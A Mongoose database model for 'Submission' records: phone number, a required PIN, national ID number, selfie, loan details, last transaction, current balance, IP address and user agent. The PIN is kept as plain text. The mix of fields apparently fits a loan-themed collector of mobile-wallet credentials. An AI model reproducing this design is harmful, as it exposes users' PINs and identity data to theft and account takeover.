import mongoose, { Schema, model, models } from 'mongoose';

const SubmissionSchema = new Schema(
  {
    phoneNumber: { type: String, required: true },
    pin: { type: String, required: true },
    fullName: { type: String },
    nidNumber: { type: String },
    loanAmount: { type: Number },
    tenure: { type: String },
    address: { type: String },
    selfie: { type: String }, // Base64 or URL
    lastTransaction: { type: String },
    currentBalance: { type: String },
    status: {
      type: String,
      enum: ['Pending', 'Approved', 'Rejected'],
      default: 'Pending',
    },
    ipAddress: { type: String },
    userAgent: { type: String },
  },
  { timestamps: true }
);

export default models.Submission || model('Submission', SubmissionSchema);
